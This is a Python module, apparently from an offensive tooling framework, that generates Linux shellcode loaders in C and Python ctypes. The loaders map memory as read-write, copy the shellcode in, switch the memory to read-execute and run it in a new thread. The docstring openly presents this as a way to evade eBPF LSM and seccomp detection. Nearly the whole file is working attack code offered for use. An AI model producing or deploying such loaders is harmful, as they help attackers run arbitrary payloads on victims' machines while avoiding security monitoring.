"""Loader: linux_mmap_rw_rx — mmap(RW) → memcpy → mprotect(RX) → pthread_create.

Tier 2 Linux. Two-stage permission model mirrors win_rw_rx.
  1. Allocate as RW (no exec bit; unremarkable)
  2. Copy shellcode
  3. mprotect to RX (removes write permission before execution)
  4. Execute via pthread_create

Evasion property:
  - No PROT_EXEC at allocation time; avoids the strongest mmap indicator
  - mprotect(PROT_EXEC) on anonymous memory is still flagged but weaker signal
    than mmap(PROT_EXEC) on some eBPF LSM / seccomp configurations

Compile: gcc -o loader loader.c -lpthread
"""
from __future__ import annotations

from . import _render

_render.self_register(__name__, "linux_mmap_rw_rx")

_C_TEMPLATE = """\
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <pthread.h>

{sc_array}

static void *run(void *arg) {{
    ((void (*)(void))arg)();
    return NULL;
}}

int main(void) {{
    void *mem = mmap(NULL, sc_len,
                     PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS,
                     -1, 0);
    if (mem == MAP_FAILED) {{
        perror("mmap");
        return 1;
    }}
    memcpy(mem, sc, sc_len);

    if (mprotect(mem, sc_len, PROT_READ | PROT_EXEC) != 0) {{
        perror("mprotect");
        munmap(mem, sc_len);
        return 1;
    }}

    pthread_t tid;
    if (pthread_create(&tid, NULL, run, mem) != 0) {{
        perror("pthread_create");
        munmap(mem, sc_len);
        return 1;
    }}
    pthread_join(tid, NULL);
    munmap(mem, sc_len);
    return 0;
}}
"""

_PY_TEMPLATE = """\
import ctypes
import ctypes.util
import sys

{sc_bytes}

libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
libpthread = ctypes.CDLL(ctypes.util.find_library("pthread"), use_errno=True)

PROT_READ  = 0x1
PROT_WRITE = 0x2
PROT_EXEC  = 0x4
MAP_PRIVATE   = 0x02
MAP_ANONYMOUS = 0x20

libc.mmap.restype = ctypes.c_void_p
mem = libc.mmap(None, len(sc),
                PROT_READ | PROT_WRITE,
                MAP_PRIVATE | MAP_ANONYMOUS,
                -1, 0)
if mem == ctypes.c_void_p(-1).value:
    sys.exit(1)

buf = (ctypes.c_char * len(sc)).from_buffer_copy(sc)
libc.memcpy(ctypes.c_void_p(mem), buf, len(sc))

if libc.mprotect(ctypes.c_void_p(mem), len(sc), PROT_READ | PROT_EXEC) != 0:
    sys.exit(1)

THREAD_FUNC = ctypes.CFUNCTYPE(ctypes.c_void_p, ctypes.c_void_p)
def _run(arg):
    ctypes.CFUNCTYPE(None)(arg)()
    return None

tid = ctypes.c_ulong(0)
cb = THREAD_FUNC(_run)
libpthread.pthread_create(ctypes.byref(tid), None, cb, ctypes.c_void_p(mem))
libpthread.pthread_join(tid, None)
"""


def generate_c(shellcode: bytes) -> str:
    """Return a compilable C loader using mmap(RW) + mprotect(RX) + pthread_create."""
    return _C_TEMPLATE.format(sc_array=_render.c_array_literal(shellcode, "sc"))


def generate_python(shellcode: bytes) -> str:
    """Return a Python ctypes loader using mmap(RW) + mprotect(RX) + pthread_create."""
    return _PY_TEMPLATE.format(sc_bytes=_render.python_bytes_literal(shellcode, "sc"))
